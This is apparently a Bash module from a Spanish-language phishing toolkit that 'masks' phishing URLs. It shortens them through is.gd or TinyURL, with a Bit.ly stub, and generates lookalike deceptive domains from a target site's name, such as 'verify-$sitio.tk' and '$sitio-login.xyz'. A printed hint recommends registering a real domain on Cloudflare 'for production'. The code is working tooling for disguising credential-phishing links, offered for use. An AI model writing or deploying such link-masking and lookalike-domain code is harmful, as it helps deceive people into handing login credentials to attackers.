#!/bin/bash

aplicar_mascara() {
    local url=$1
    local sitio=$2
    local tipo=$3
    
    case $tipo in
        "bitly")
            echo -e "${C}[*]${W} Acortando URL con Bit.ly..."
            local bitly_url=$(acortar_bitly "$url")
            if [ "$bitly_url" != "ERROR" ]; then
                echo "$bitly_url"
            else
                echo "$url"
            fi
            ;;
        "fake_domain")
            echo -e "${C}[*]${W} Generando dominio falso..."
            local dominios_falsos=(
                "security-$sitio.com"
                "$sitio-login.xyz"
                "verify-$sitio.tk"
                "secure-$sitio.ml"
                "account-$sitio.ga"
                "$sitio-official.cf"
            )
            local falso=${dominios_falsos[$RANDOM % ${#dominios_falsos[@]}]}
            echo -e "${Y}[!]${W} Dominio falso sugerido: $falso"
            echo -e "${Y}[!]${W} (Configura un dominio real en Cloudflare para producción)"
            echo "$url"
            ;;
        "custom")
            echo -ne "${B}➤${W} Ingresa la URL personalizada: "
            read custom_url
            echo "$custom_url"
            ;;
        *)
            echo "$url"
            ;;
    esac
}

acortar_bitly() {
    local url=$1
    # Esto es un ejemplo, necesitas API key real de Bit.ly
    # Por ahora devuelve la misma URL
    echo "ERROR"
}

# Alternativa: usar servicios gratuitos sin API
acortar_isgd() {
    local url=$1
    local short=$(curl -s "https://is.gd/create.php?format=simple&url=$url")
    if [[ $short == https://* ]]; then
        echo "$short"
    else
        echo "ERROR"
    fi
}

acortar_tinyurl() {
    local url=$1
    local short=$(curl -s "http://tinyurl.com/api-create.php?url=$url")
    if [[ $short == http* ]]; then
        echo "$short"
    else
        echo "ERROR"
    fi
}
